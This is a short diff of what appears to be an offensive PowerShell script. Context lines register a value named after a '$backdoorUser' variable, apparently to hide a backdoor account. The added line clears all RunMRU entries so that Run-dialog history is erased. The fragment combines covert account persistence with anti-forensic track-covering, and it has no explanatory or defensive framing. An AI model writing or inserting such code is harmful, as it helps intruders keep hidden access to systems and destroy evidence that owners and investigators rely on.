@@ -20,3 +20,4 @@ if (-not (Test-Path $regPath)) {
 }
 
 New-ItemProperty -Path $regPath -Name $backdoorUser -PropertyType DWord -Value 0 -Force
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
